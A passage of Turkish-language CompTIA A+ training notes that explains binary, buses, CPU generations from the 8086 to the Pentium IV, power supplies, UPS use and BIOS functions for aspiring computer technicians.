hızlı veya daha yüksek kapasiteli parçalarla nasıl değiştireceğimizi ve
bunları yükseltirken mevcut datalarımıza zarar vermemek için neler
yapmamız gerektiğini tartışıyor olacağız.
Chapter 21. Troubleshooting Techniques and Client Relations
Bu bölümde, hardware ve software kaynaklı problemleri nasıl
çözeceğimizi, örneğin tamamen çökmüş bir hard drive’ı veya bozulmuş
sistem dosyaları olan bir işletim sistemini nasıl ayağa
kaldırabileceğimizi tartışıyor olacağız. Ayrıca müşteri ile olan
ilişkilerde nelere dikkat etmemiz gerektiğini de inceleyeceğiz.
Chapter 22. The Basics of Electrical Energy
Bu bölümde elektrik ile bilgisayar arasındaki ilişkiyi ve
teknisyenin basit testleri yapabilmek ve güvenli çalışabilmesi için
gerekli kuralları inceleyeceğiz.
Appendix A. Questions and Answers
Ek modül. Her chapter’in sonunda yer alan Q/A sorularının çözümleri
Appendix B. Table of Acronyms
Ek modül. Bilgisayar ile ilgili çoğu kısaltmaların açılımlarını bulabileceğiniz tablo.
CHAPTER 1. Introduction to Computers
Neden A+ öğreniyoruz ?
Bilgisayar kullanıcılarına destek verebilir hale gelebilmemiz için
önce temelimiz sağlam olmalıdır. Amerika’ya çalışmaya giden Sistem
mühendisleri, iş görüşmelerinde bildiklerini anlatırlarken, “peki bu
programları üzerine yükleyeceğin ve çalıştıracağın donanımlar hakkında
bilgin nedir” sorusu ile karşılaşmışlardır. Bu yüzden, üzerinde
çalıştığımız işletim sistemlerinden önce, bu sistemlerin kullandıkları
donanımlar hakkında bilgi sahibi olmalıyız.
Bilgisayarın Tarihçesi
Eskiden insanlar nasıl hesap yapıyorlardı ? (Kağıt, kalem, daha
sonraları abaküs yani bon-cuklar kullanarak hesap yaptılar) Daha sonra
Facit’ler (mekanik-kollu hesap makineleri) kullandılar. En sonunda
elektronik işin içine girdi ve hesaplama işleri farklı boyutlar aldı.
İlk PC 1970’lerde yapıldı, gerisini kitabınızdan okuyabilirsiniz.
The Role of a Computer Service Professional
Bilgisayar endüstrisindeki hızlı gelişim, bilgisayar sektöründe
çalışan profesyonellerin rollerini de değişikliğe zorlamaktadır.
Eskiden bir tornavida, pense, başlangıç disketi ve MS-DOS bilgisi ile
gayet rahat bir şekilde teknik destek verebiliyorduk. Çünkü çeşitlilik
yoktu. Fakat gelişen teknoloji ve her gün yeni bir donanımın piyasaya
sürülmesi ve bunun paralelinde yeni işletim sistemlerinin çıkması ile
beraber, profesyonellerin de yükü arttı. Şimdi piyasada her donanımın
birsürü çeşidi markası var, bunları kullananlara destek verebilmek için
de sürekli kendimizi güncel tutmalı ve öğrenmeye ara vermemeliyiz.
(Dergideki network sorusu örneği)
Bir bilgisayar profesyoneli aşağıdaki tanımlamalara uyarsa, bu sektörde para kazanmaya devam edebilir, aksi halde işi zordur :
- Technician : Hardware ve software problemlerini doğru ve kısa sürede bulabiliyor ve çözebiliyor olmalısınız.
- Scholar (Ogrenci) : Bilmediğiniz sorunların cevaplarını
kaynaklardan (özellikle internet) öğrenebiliyor ve bu şekilde
bilgilerinizi geliştirebiliyor olmalısınız. Öğrenme hiçbirzaman bitmez.
- Diplomat : Ve bu bilgilerinizi karşınızdaki müşteriye
hissettirebiliyor olmalısınız. Müşteri, problem ile ilk kez karşılaşmış
olsanız bile çözebileceğinizi hissetmez ise işi alamazsınız.
CHAPTER 2. Understanding Electronic Communication
Lesson 1 : Computer Communication
Insanlar kelimeleri kullanarak anlaşırlar. (Konuşarak ya da yazarak)
Bu esnada kendilerine ait olan dilleri kullanırlar, ortak dil
konuşuyorlarsa birbirlerini anlayabilirler.
Uzun mesafelerde nasıl anlaşırlar ?
Kızılderililer dumanla anlaşırlardı.
Gemiler ışıklar yakıp söndürerek anlaşırlar.
Telgraf icat edilince insanlar, elektrik sinyallerinin kablolar ile
aktarılıp Mors alfabesi sayesinde haberleşmeye başladılar. (Nokia
melodisi mors alfabesinde Connecting People demek)
Bir devrede elektrik ya vardır ya yoktur. Ya açık olabilir ya da
kapalı. Bunu matematiksel olarak ifade etmek istersek, 1’ler ve 0’ları
kullanabiliriz.
1 ve 0’ın bulunduğu sayma sistemi nedir ? (Binary System). Bilgisayarlar, Binary Sistem sayesinde anlaşırlar. 0 ve 1 ‘ler.
Bit : Bunlar bir şekilde ölçülmeli (kg, litre, metre gibi). Binary sistemde en küçük birime bit denir. 0 ve 1. On / Off.
Byte : 8 bitten oluşan grup. 1 karakter 1 Byte’dır. Klavyede 1 karaktere basmak, CPU’ya 1 byte veri göndermek demektir.
Kilobyte (KB) : 1024 byte (2^10) Niye 1024 ? Çünkü 1000’e en yakın 2^10
Megabyte (MB) : 1024 Kb (2^20)
Gigabyte (GB) : 1024 Mb (2^30)
Binary System : 2 rakam kullanır : 0 ve 1. 0=Off, 1=On. (0=00000000, 255=11111111. Toplam 256 rakam)
Hesaplama Şekli : 10’luk sistemde 8126=(8×10³ + 1×10² + 2×10¹
+ 6×10º) 2’lik sistemde de aynı. 01000010= (0×128 + 1×64 + 0×32 + 0×16
+ 0×8 + 0×4 + 1×2 + 0×1) = 66 (0,5 ve 9 ‘u binary code ile alt alta
yaz, 3’ünü topla.)
Parallel and Serial Devices : (Çizerek) Seri yani tek
kablodan aynı anda kaç sinyal gidebilir ? 1 sinyal (olasılık 2^1=2),
1’den fazla giderse collusion olur. Tek şeritli yol örneği. Birbirine
paralel 8 kablodan aynı anda kaç sinyal gider ? 8 sinyal (olasılık
2^8=256) 8 şeritli otoban gibi.
ASCII (American Standard Code for Information Interchange) : Harfleri
bilgisayara nasıl tanıtacağız ? ASCII, klavyede kullandığımız her
karakterin bilgisayarın anlayabileceği konuma çevirme standardıdır.
Evrensel (her ülkede aynı) olmak zorunda çünkü Turkiyede de, Amerikada
da cpu sadece binary code’dan anlıyor. Sayfa 18’de her karakterin
karşılığı binary code’lar var, orjinal 128 extended 128 olmak üzere
toplam 256 adet. Neden ? Çünkü 2^8=256 kombinasyon var. (A=65=01000001,
Space=32=00100000). Ismini yaz alt alta, herkes kendi ismini yazsın,
binary’e çevirsin. (Japonca, Cince, Rusca vs farklı standartlar, bizi
ilgilendirmiyor)
Lesson 2 : The Computer Bus
Bilgisayar içerisinde, bir noktadan diğer noktaya sinyal taşıyan
yollara bus diyebiliriz. Bunlar kartların üzerinde bakır teller de
olabilirler, kablo içerisindeki teller de. Birbirine paralel birden çok
(8 bit-16bit-32bit-64bit) telden oluşurlar. Otoban örneği.
Bir telden aynı anda kaç sinyal gidebilir ? ((1)) Daha fazla
göndermeye çalışırsak collusion olur. Birbirine paralel 8 telden kaç
sinyal gidebilir ? ((8))
CHAPTER 3. An Overview of the Personal Computer
PC’ler 3 safhada çalışırlar. Sizden bir bilgi girmenizi isterler
“INPUT”, girdiğiniz bilgiyi işlerler “PROCESSING” ve size istediğiniz
şekilde geri verirler “OUTPUT”.
Input : Dışarıdan veya bilgisayarın içinde başka bir cihazdan
processor’a data girilmesi. Örnek : Klavye, mouse, scanner, mikrofon,
cd-rom, dvd-rom.
Processing : Girilen data’nın bilgisayar tarafından işleme
sokulması. Örnek : CPU. Bilgisayarda veri nasıl işlenir ? CPU her türlü
data yönetiminden sorumludur fakat bazı farklı cihazlar olmazsa bir işe
yaramaz. Bunlar bir PC’nin başlıca elemanlarıdır :
· Motherboard (Anakart) : Her cihazın üzerine bağlandığı kart (Araba şasi örneği)
· Chip Set : Data’nın akışını yöneten ve kontrol eden chip ve entegre devre grubu.
· Data Bus : Anakart üzerinde bulunan, CPU tarafından dataların
(elektrik sinyallerinin) cihazlara gönderildiği ve alındığı
birbirlerine paralel yollar.
· Address Bus : Data bus’ta gidip gelen dataların nereden gelip
nereye gittiklerinin CPU tarafından “adreslendiği” birbirlerine paralel
yollar.
· Expansion Slots : Anakart’a ek cihaz takabileceğimiz “genişleme” yuvaları.
· Clock : CPU’nun command’ları ne kadar zamanda bitirebileceğini belirten hız. (Ör : 800 Mhz = 800 milyon commands/sn.)
· Battery : Bilgisayarın setup’ı ile ilgili bilgilerin, elektrik
kesildiğinde veya bilgisayar kapatıldığında saklanabilmesi için gereken
enerjiyi sağlar.
· Memory : Dataların geçici süre için yazılabildiği kartlar.
 
(Not : MCC’den daha sonra bahsedilecek ama kısaca CPU’nun RAM ile
arasındaki, memory’e gidecek ve memory’den gelecek dataları yöneten,
memory’i belli aralıklarla refresh eden chip)
Output : İşlenen data’nın istenilen şekilde sonuçlarının getirilmesi. Örnek : Printer, monitor, plotter, speakers.
Input/Output : Floppy, HDD, modem, network card, cd recorder, tape drive.
Support Hardware : Power Supply (Gelen elektriği 3.3, 5 veya 12
volt’a çevirir. Anakart kaç volt ile çalışıyorsa), Surge Suppressor
(Regulatör gibi, elektrik dalga-lanmalarından korur), UPS (Hem
regulatör gibi çalışır, hem de elektrik kesintilerinde bilgisayarınızı
kapatıncaya kadar elektrik sağlar. Battery backup’tır), Case
(Bilgisayar parçalarının büyük bölümü ihtiva eden kutu, diğer cihazlar
ile elektrik yalıtımı sağlar, fanları sayesinde içerideki havayı
sirküle ederek aşırı ısınmayı önler).
CHAPTER 4. The Central Processing Unit
Lesson 1 : Microprocessors
CPU ne işe yarar ? Dataların işlenmesi ve PC içindeki kontrolü. CPU
aslında bir (IC) entegre devredir. (IC=Bir devrenin üzerinde birden çok
özelliğin toplanması) Tek bir yapı ama birçok işe yarıyor. (Elektrik
anahtarı entegre devre mi ? Hayır, sadece ışıkları açar-kapar) CPU
beyin, Data Bus sinir sistemidir. Her organ sinir sistemine bağlıdır.
· External Data Bus : Önceki derslerimizde, bilgisayar içerisinde
cihazlar arası yolculuk eden dataların (binary code ile) gidip geldiği
yollara “Bus” demiştik. External Data Bus (external bus, data bus)
dataların cihazlar arasında yol aldığı ve her cihazın bağlı olduğu
primary route’dur. (Ilk cıkan bilgisayarda 8bit = 8 paralel yol, 1 byte
data at a time, 16bit, 32bit ve şu an 64bit = 64 paralel yol, 64
şeritli otoban)
 
· The CPU : Bilgisayarda aritmetik ve mantıksal işlem yapılan bölüm. Bilgisa-yardaki her türlü veri akışını kontrol eder.
o Transistors : İnsanlar hücrelerden oluşur, CPU’lar ise
transistörlerden. (yapıtaşları transistörlerdir) 1/0 sinyalleri veren
elektronik switchler-dir. On/off posizyonları alarak binary code’u
oluştururlar. Positive voltaj verildiğinde elektronlar harekete geçer
ve transistör açık (On) hale gelir. Ne kadar çok transistör varsa CPU o
kadar güçlü demektir. (8088’de 29.000 tane, PIV’de 50.000.000 tane)
o Microprocessor Design : CU (Komuta eder – Yönetici), ALU
(Aritmetik mantıksal işlemleri yapar – İşçi), I/O U (Verilerin CPU’ya
giriş çıkışını sağlar – Kapıdaki bekçi)
 
o Internal Cache : İşlemcinin içine giren data Internal cache’de sırasını bekler. (Data cache’de) (Bekleme odası gibi) (L1)
o Registers : Sırası gelen datanın işlenmesi için bir operasyon
odası olması lazım, bu oda kendi içinde ufak kutucuklardan oluşur
(registers), karalama kağıdı, müsveddeler gibidir, ALU orada hesapları
yapar, sonra siler.
o Codes : ASCII code’ları, keyboard üzerindeki karakterlerin binary
olarak sunulmuş şekilleridir. Biz klavye üzerinde bir tuşa bastığımızda
ilgili ASCII kodu genere edilir ve data bus’dan gönderilir. Diğer
kodlar PC’ye datayı nasıl monitöre aktaracağını, device’lar arası nasıl
iletişim sağlayacağını (ör: printer, scanner) söyler. Program kodları
da, CPU ’ya yazılımın nasıl çalışacağını söyler.
o The Clock : PC’de zamanlama çok önemlidir. Opera gibi düşünürsek,
herkes aynı anda istediği şeyi çalarsa gürültü olur. Clock’u bir
orkestra şefi gibi düşünebiliriz. Bir tempo tutar (pulse a voltage) ve
senkronizasyonu sağlar. (CPU internal clock) Pulse ettiği her voltaj 1
clock cycle’dır. Her command en az 2 clock cycle’da gerçekleşir.
o Clock Speed : Bilgisayarların hızı ne ile ölçülür ? Hz (Mhz, Ghz)
CPU’nun 2 cycle’da kaç command bitirebileceğini belirten hız. (Örneğin,
450 Mhz = 450 milyon işlem/sn.)
 
· Memory : CPU dataların hepsini üzerinde tutamaz, bunun için
yardımcı chipler gerekir. Dataları geçici süre üzerinde tutan chiplere
RAM denir. CPU istediği an istediği bölüme yazabildiği için “Random
Access” denmiştir. (Ram Hdd’ye göre milyonlarca kat hızlıdır, CPU da
Ram’den yaklaşık 1000 kat hızlıdır) (Chapter 7’de daha geniş işlenecek)
o Address Bus : RAM’in üzerinde saklanan bilgiler sürekli değişir.
Sistem için, hangi memory bölümü hangi işlem için ayrılmış ve hangi
bölüm kullanılabilir bilgisi çok önemlidir. Bunun için memory
bölümlerinin adreslenmesi yani dolu-boş bilgilerinin CPU’ya
gönderilmesi gerekir. Bu işlemler, Address Bus üzerinden yapılır.
Adress Bus, RAM’i sisteme bağlar memory kullanıldıkça sinyaller
üzerinden geçer. Address Bus’ın genişliği, CPU tarafından ne kadar
memory adreslenebileceğini belirler. (8088’de 20bits=2^20 combination =
1.048.576=1MB RAM, PIV’de 32bits=2^32 combination = 4GB RAM)
CPU, Memory bus’a direkt bağlı değildir, Memory Control Chip (MCC) sayesinde istek gönderir ve sonuç alır.
 
· How Microprocessors Work : CPU PC içinde nasıl çalışır basit bir
örnekle inceleyelim. 2+2=4 sonucuna CPU’nun hangi basamakları geçerek
ulaştığına bir bakalım :
o Kullanıcı klavyede bir rakama bastığında (Calculator programı gibi
bir program açıkken), prefetch unit, CPU üzerindeki (instruction
cache-deki) instruction’lara bu datayı ne yapacağını sorar ve data CPU
tarafından RAM’e ve kendi Instruction Cache’ine yazılır.
o Prefetch unit, code’un bir kopyasını ister ve decode unit’e
gönderir, bu code binary code’a çevrilir ve CU’ya gönderilir ve CU
datayı data cache’in X (herhangi) bir bölümüne yazar ve prosesin
devamını bekler.
o + tuşuna basılınca, prefetch unit tekrar instruction cache’e ne
yapacağını sorar ve aldığı code’u çevirerek (translate) CU ve data
cache’e gönderir. Böylece ALU ADD fonksiyonunu yapmak üzere
haberlendirilir.
o Kullanıcı 2 tuşuna basınca aynı prosesler tekrarlanır.
o CU kodu alır ve ADD comand’ını ALU’ya gönderir. ALU işlemi yapar ve Registerda saklanması için 4 sonucunun code’unu gönderir.
o Kullanıcı = tuşuna bastığında, prefetch unit instuction cache bunu
ne yapacağını instruction cache’e sorar ve aldığı cevabı binary code’a
çevirerek CU’ya yollar. Ve sonuç register’dan okunarak ekrana yansır.
· PC Microprocessor Developments and Features : CPU’nun zamanla
geliştiril-mesi ve yüksek performans elde edilmesi aşağıda
sıralayacağımız elemanla-rının geliştirilmesi ile sağlanmıştır.
o Speed : 2 Clock Cycle’da kaç command bitirebilir. Hız arttıkça, bitirebileceği command sayısı da artacaktır.
o Transistör sayısı : Daha çok transistör, daha büyük hesap gücü.
o Registers : Registerların boyutları büyüdükçe, daha komplike commandlar 1 adımda yapılabilir.
o External Data Bus : Büyüdükçe yol alabilecek data miktarı artar.
o Address Bus : Büyüdükçe CPU tarafından RAM’de adreslenebilecek data miktarı artar.
o Internal Cache : CPU üzerindeki yüksek hızlı memory’dir.
Büyüdükçe, hız açısından daha yavaş olan RAM’e veya HDD’e gönderilecek
data miktarı azalır, böylece hız kazanılır.
· Cpu’lar ve Gelişim Süreci
o 8086 ve 8088 : PC’lerde kullanılan ilk CPU’lardır. 29.000
transistör, 4,77 / 10 Mhz, 16bit Register, 16bit External Data Bus
(8086’da 16bit 8088’de 8 bit, tek fark bu aralarında), 20bit Address
Bus. CPU yapısı (CPU Packaging) 40 Pin DIP (Dual Inline Package).
 
o 286 : 24 bit Address Bus (2^24=16MB Ram imkanı var), 20 Mhz Clock Speed.
· İki memory modunda çalışabiliyordu : REAL MODE (kendinden
önceki CPU’lar ile aynı), bir program çalışmaya başlayıp kendisini
memory’e alınca başka programlar memory’de bulunamıyorlar. Program
memory’nin tamamını bloke ediyor. PROTECTED MODE (Multitasking)
OS devreye giriyor, programa ihtiyacı kadar olan memory alanını
sağlıyor, Böylece başka bir program da baska bir memory alanına yazılıp
aynı anda çalışabiliyor. (286 bu desteği getirmiştir fakat o zaman bunu
yapabilecek bir OS henüz yoktu)
· Virtual Memory (Sanal Bellek), Sistem Memory’nin (RAM)
yetmediği zamanlarda devreye giren, Hdd içerisinde ayrılmış olan bölüm.
CPU o bölümü RAM olarak kullanıyor. O zaman niye RAM’e para veriyoruz
da HDD’den kullanmıyoruz ? Hız. Default VM boyutu = 1,5 x RAM,
Win9x/Me’de win386.swp (C:\Windows\ ), W4x/2K/XP/2K3’de pagefile.sys
(C:\ ). (286 bu desteği getirmiştir fakat o zaman bunu yapabilecek bir
OS henüz yoktu)
· CPU Yapısı DIP, PGA (Pin Grid Array) ve PLCC (Plastic Leadless Chip Carrier)
 
PLCC : Ayaklar CPU’nun yanında PGA : Ayaklar altta
NOT : LIF SOCKET (Low Insertion Force) : CPU’yu sockete koyunca yerine tam oturması icin bastırmak gerekiyor.
ZIF SOCKET (Zero Insertion Force) : CPU’yu sockete koyduktan sonra yandaki kol yardımıyla yerine oturtuluyor.
o 386 : 275.000 transistör, 386 DX’de herşey 32bit (Register, Ext
Data Bus, Address Bus), 386 SX’de Ext. Data Bus 16bit, Address Bus
24bit Amaç MARKETING. DX-SX’in bir anlamı yok (kısaltma değil)
· Intel 386’da INTERNAL CACHE (L1) yok, AMD 8DXLV’de 8 Mb L1 cache var.
· OS daha karmaşık işlemlere ihtiyaç duymaya başladığı için, Mathco Processor üretiliyor, 386’da yok, olanına 387 deniyor.
· CPU Yapısı PGA (Pin Grid Array) veya PLCC (Plastic Leadless Chip Carrier)
o 486 : ~1.200.000 Transistör, herşey 32 bit, 486DX’de Mathco processor var, 486SX’de yok (tek fark bu).
· Hepsinde min. 8 Kb L1 Cache var (486 ile L1 standart oldu) DX4’de L1 cache 16 Kb. (Standart PIII, PIV’lerde 64 Kb.)
· Anakart hızı 25 ve 33 Mhz, CPU’lar ise hızlandı. (Ornegin DX2×66
demek, 33 Mhz x 2 = 66 Mhz’de çalışıyor demektir. DX4×75 demek, 25 Mhz
x 3 = 75 Mhz’de çalışıyor demektir. DX4×100 demek, 33 Mhz x 3 = 100
Mhz’de çalışıyor demektir) Sebebi, CPU hepsinden hızlı çalışmalı ki her cihaza aynı anda cevap verebilsin.
· Şu anda bile anakartlar 100, 133 Mhz’de çalışıyor. (1,56 Ghz CPU,
100 x 15 çarpanı ile çalışıyor.) Yani anakartın Clock’u ile CPU’nun
Clock’u farklı çalışıyor. (Not : Çarpanlar 0.5’er 0.5’er artar. 1, 1.5,
2, 2.5 … )
· Hızlar artmaya başladığı için ısınmalar arttı. Soğutmak için Heatsink
kullanıldı. Heatsink (alüminyum) CPU’nun üzerine yapıştırılır ve ısıyı
CPU’dan alıp ortama verir. (Neden alüminyum ? Çünkü ısıyı çok iyi
iletiyor). PASİF SOĞUTMA denir bu işleme.
· Pasif soğutma yetmeyince ortama fan eklendi. Heatsink’in üzerine takılır, heatsink olmadan fan bir işe yaramaz. Buna da AKTİF SOĞUTMA denir.
o Pentium : Neden 586 değil ? Çünkü Intel ürettiği CPU’lara telif
almak istedi fakat rakamlara telif alınamadığı için Penta (Latincede 5)
sözcü-ğünden ürettiği Pentium’a telif aldı.
· Anakart hızı 66 Mhz.
· Address Bus, registers aynı kaldı (32bit), Data Bus 64 bit oldu.
· Dual Pipeline teknolojisi geldi. CPU databusdan gelen dataları
teker teker alıyordu, ikişer ikişer almaya başladı. (Her şeride 2 araba
sığdırdılar)
· L1 cache 2ye ayrılıyor, 8Kb Data Cache, 8Kb Instruction Cache
· Branch Prediction : (Öngörmek) İşlemcinin, sürekli gelen
komutların sonuçlarını cache’e yazarak, birdaha aynı komut geldiğinde
hemen cevap vermesi. (Proxy server, Isa Server gibi. Caching, internet
örnek verilerek anlatılabilir.
o Pentium Pro : Serverlar için özel design edilmiştir.
· NT 4.0’dan itibaren OS’ler 32bit kullanmaya başladılar. (O zamana kadar hardware 32bit olmasına rağmen kullanacak OS yoktu)
· Şimdiye kadar CPU’lar CISC (Complex Instruction Set Computing)
kullanıyorlardı, Pro ile beraber RISC (Reduced Instrucion Set
Computing) kullanmaya başladılar. Instruction Cache daha çok
instruction alabiliyor artık.
· L2 cache CPU içine girdi. L2 cache’in hızı arttı fakat MALİYET çok
arttı. (Avantajı, CPU’da 5 milyon transistör, L2’de 20 milyon
transistör = Toplam 20 milyon transistör)
o Pentium MMX : (Multimedya Extensions) Multimedya ne demektir ?
Video, ses, oyun amaçlı programların tümü. Mp3, Divx vs sıkıştırılmış
datalardır. İşlemci daha fazla çalışır bunları oynatabilmek için.
Yavaşlamayı önlemek için MMX çıktı. ALU’nun kullandığı instruction
cache’in içerisine 57 adet extra code eklenmiş.
· SIMD (Single Instruction Multiple Data) Aynı command ile
daha çok işlem. (Örnek : Eğitmen herkese ayrı ayrı soracağı-na, toplu
olarak soruyor “sorusu olan var mı” diye.)
· L2 Cache tekrar dışarıda, daha ucuz olsun diye.
o Pentium II : Yapı socket’ten slot’a döndü. L2 cache’i CPU ile aynı
kart üzerine koyup, CPU’nun yarı hızında çalıştırdılar. (Anakarttan çok
daha hızlı)
· Anakart hızları 100 Mhz’lere çıktı.
 
· Multiple Branch Prediction : Birden fazla prediction yapabiliyor.
· Data Flow Analysis : Bilgi akışını kendisi analiz ediyor. Kendine göre yeniden sıralıyor, böylece daha hızlı çalışıyor.
· Speculative Execution : Örneğin alınan talimat ışığı kapat, kapıyı
kilitle, klimayı kapat, sen sırayı değiştirip klimayı kapatıyorsun önce.
· SEC Packaging : (Single Edge Connector) CPU’nun tek bir kenarı anakarta temas ediyor.
· Dual Independent Bus : L2’lere cache bus ile bağlanıldığı için yüksek performans getirdi.
· İki işlemciye destek veriliyor. (SMP)
· ECC (Error Correction Coding) : (Memory’de anlatılacak) Hata
düzeltme kodu, data transferi doğru gerçekleşti mi gerçekleşmedi mi
sağlama yapıyor.
· Pipelined FPU : Mathco Processorun gelişmişi, artık multimedya
revaçta olduğu için ekranda hareket eden cisimler var ve bunların
koordinatlarının sürekli hesaplanması lazım.
· Parity Protection : (Memory’de anlatılacak) Hata düzeltme.
· SIMD tam olarak kullanılmaya başlandı.
o Celeron : Marketing amaçlı, PII’den sonra çıktı. Tek fark L2
bellekti. İlk çıkan Celeronlarda L2 yoktu. Celeron 300A ile 128 KB L2
cache koyuldu.
o Xeon : Pentium Pro’nun yerine, serverlarda kullanılmak için
tasarlandı 7.5 milyon transistör ve 2 MB’lere varan L2 cache. Pahalı
idi.
o Pentium III : Anakart hızları 100 ve 133 Mhz.
· Önce slot üretildi, sonra sockete dönüldü. (500 Mhz ve sonrası 500’lerin de bazıları slot bazıları socket)
· Slot olanlar 100 Mhz’de, socket olanlar 133 Mhz’de çalışırlar.
· Slotta L2 512 KB, sockette L2 216 KB.
· SSE (Streaming SIMD Extensions) : Divx, Mp3, Internetten Radyo gibi sıkıştırılmış dataları daha hızlı okuyor.
· PIII’ler 3 çeşit : Normal PIII, Celeron ve Xeon.
o Pentium IV : SSE2 çıktı. (SSE’nin hızlısı)
· 3.0 Ghz üzerine çıkıldı.
· RDRAM çıktı PIV için. (Anakartın 4 kat hızında çalışıyor)
· Multithreading : 1 CPU’nun 2 CPU gibi çalışması. (Gelişmişi Hyperthreading)
Thread » Process » Application (Threadler processleri, processler
applicationları oluştururlar) Aşağıdaki örnekte her bir satır 1
threaddir ve threadler bölünemez. Hangi CPU ile geldi ilk ? Pentium ile
geldi.
 
· Hyperthreading (SMT (Symetric Multi Threading)): Burdada 1 CPU 2
CPU gibi çalışıyor. Farkı, Multithreading sadece boş satırları
doldurur, hyperthreading doldurabildiği tüm boşlukları doldurur.
Performansı ~%70 arttırır.
· SMP (Symetric Multi Processing) : Anakart üzerinde birden fazla
CPU olması. Bütün CPU’lar aynı olmak zoruda. (PIV 1800 x 2 örneğin)
Lesson Summary
· CPU günümüz bilgisayarlarının en önemli parçasıdır.
· CPU’nun geliştirilme aşamalarını anlamak, eski teknolojilerle yeni teknoloji-leri karşılaştırmak açısından önemlidir.
· CPU’ların performanslarını ölçmede kullanılan 3 önemli anahtar; hızı, address bus ve external data bus’ıdır.
· 286’nın çıkması ile birlikte, bilgisayarlar hem Real hem de
Protected mode’da (Multitasking) kullanılmaya başlandı, 16 MB memory’e
çıkıldı. (24bit AddBus)
· 386 ile birlikte 32bit işlemlere ve 4 GB memory’e çıkıldı. (32bit AddBus)
· 486’lar 386 processorlerin L1 cache’li olanı.
· Pentium’lar tamamen yeni teknoloji ile üretilmeye başlandılar,
RISK (instruc-tion boyutlarını küçülterek instruction cache’de daha çok
instruction) ve gerçek multithreading kullanılmaya başlandı.
· Multimedya amaçlı MMX processorler üretildi.
· Pentium III’ler ile birlikte SSE (Streamlined SIMD Extensions) geldi.
· Gunun bilgisayarları PIV’ler ve hızları 3 Ghz civarında.
Lesson 2 : Replacing and Upgrading CPU
Anakartı değiştirmek istemiyorsan, aynı cins CPU kullanabilirsin
(PII-PII, PIII-PIII). Ama tavsiye edilen bir veya en üst cinse geçmek,
çünkü aynı cins upgrade çok anlamlı değil.
PIII slot’tan PIII socket işlemciye geçmek istiyor ama anakartı
değiştimek istemiyor isen, “Slot-socket converter” kullanman gerekiyor.
LIF SOCKET (Low Insertion Force) : CPU’yu sockete koyunca yerine tam
oturması icin bastırmak gerekiyor. Çıkartması ise güç, özel aletler
yada tronavida ile çıkıyor.
ZIF SOCKET (Zero Insertion Force) : CPU’yu sockete koyduktan sonra
yandaki kol yardımıyla yerine oturtuluyor. Çıkartılması da aynı şekilde
kol yardımı ile yapılıyor.
CHAPTER 5. Power Supplies
Lesson 1 : Power Supplies
· Power Supply ne işe yarar ? Converter gibi, şebeke akımını doğru
akıma çevirir. PC içerisindeki tüm cihazlara DC (direct current - doğru
akım) sağlar. Dışarıdan gelen akımı, 3.3 - 5 volt (board için) ve 12
volt (hard drivelar için) DC akıma çevirir. Çoğu power supply soğutma
amaçlı fanlara da akım sağlar.
· İki çeşit power supply var : AT - ATX. PII ve sonrasında ATX kullanılıyor.
· AT’den siyah dörtlü bir kablo çıkar, kasanın power switch’ine bağlamak için. (Açma-kapatma için) (ATX’de yoktur)
· ATX’de bilgisayar OS tarafından kapatılabiliyor. (Soft Power Down)
Soft hem software hem de soft anlamında kullanılıyor. Televizyonlardaki
stand-by gibi, kapatılsa bile board üzerinde 5V elektrik dolaşıyor.
Böylece NIC veya modem tarafından wake-on imkanı var.
· ATX’de tek (P1) connector anakarta girer (2 sıra 20 pin).
· AT’de (P8 ve P9) connectorler anakarta girer. (1 sıra 6 pin -
toplam 12 pin). Dikkat edilmesi gereken nokta, bu iki parçayı anakarta
takarken, siyah kabloların içe gelmesidir. Aksi halde yakar kartı ve
cihazları. Siyah = Toprak.
· MOLEX CONNECTOR : HDD ve CD-ROM elektriği sağlar. Köşeleri
kesiktir, ters takılamasın diye. Cihazlar için yeterli kablo yoksa
SPLITTER ile çoğaltılır, kablonun boyu cihaza yetişmiyorsa EXTENDER ile
uzatılır.
· MINI CONNECTOR : Floppy elektriği sağlar. Ters takılırsa floppy çalışmayabilir.
Lesson 2 : Power Supply Problems
· Surge : Kısa süreli voltaj artışı. Şebekeden veya yıldırım düşmesinden kaynaklanabilir.
· Spike : Çok kısa süreli voltaj artışı.
· Sag : Kısa süreli voltaj düşmesi. (Surge’in tersi)
· Brownout : Sag’in 1 sn’den fazla sürmesi.
· Blackout : Elektriğin tamamen gitmesi.
Bu 5 maddenin de çözümü UPS’dir. (Uninterruptable Power Supply)
UPS’ler büyük pillerdir. Laptop pili örnek verilebilir. Laptop
elektriğe bağlı ise elektriği şebekeden alır ve pil yorulmaz,
elektrikten çekersen pil devreye girer. Ortamda jeneratör varsa ?
Jeneratör, elektrik kesildikten 1-2 saniye sonra devreye girer,
bilgisayarlar için bir faydası yoktur. UPS ise hep devrededir,
bilgisayar kapanmaz, regulator görevi de gördüğü için ani akım
değişikliklerinden etkilenmez.
Elektriğin ne zaman geleceği bilinmiyorsa, bilgisayardaki programlar
ve bilgisayar data kaybını önlemek için kapatılmalıdır. En azından
monitörler kısa sürede kapatılmalıdır çünkü çok güç harcarlar. Laser
printerlar UPS’in sağlayabileceğinden daha fazla elektrik talep
edebileceğinden, UPS’lere takılmamalıdır.
CHAPTER 6. Motherboard and ROM BIOS
Lesson 1 : Computer Cases
· Kasalar ne işe yarar ? Bilgisayarın iç komponentlerini, dış
etkenlerden (özellikle toz, içecek dökülmeleri ve EMI - electromagnetic
interface - elektromanyetik etkilerden korur)
Lesson 2 : Motherboards
· Anakart ne işe yarar ? Tüm cihazların takıldığı karttır (araba
şasisi gibi). Bilgisayarın hız, memory vs özelliklerini anakartın
özellikleri belirler.
Lesson 3 : ROM BIOS
· Anakart takılı cihazları nasıl tanır ve aklında tutar ? BIOS (Basic Input Output System) sayesinde.
· BIOS’un görevleri ;
o Görev 1. PC açılırken POST yapar (Power on Self Test). İki
kademede yapılır; 1. CPU-RAM-EKRAN KARTI çalışıyor mu çalışmıyor mu
kontrol eder, üçünden biri bozuksa hiç açılmaz ve beep sesi ile uyarı
verir. 2. Ekran kartı testi geçilirse ekran açılır ve diğer testler
yapılır (Ram okuma yazma testi, klavye, cpu saat çarpanları vs.)
o Görev 2. Hangi cihazlar takılı, özellikleri nelerdir kontrol eder. (Örneğin kaç GB HDD var, düzgün çalışıyor mu ?)
o Görev 3. PC üzerindeki OS’i çalışması için tetikler. OS’ler programdır ve kendi kendilerine çalışamazlar.
o Görev 4. Tarih ve saat ayarlarını tutar. Windows, saat ve tarihi
BIOS’dan alır. Windows içinde saati değiştirdiğin zaman aslında BIOS’un
saatini değiştiriyorsun.
· Rom Bios : (Read-only memory) Elektrik kesildiğinde dahi
üzerindeki datayı koruyan memory. Böylece PC açılmak için gerekli
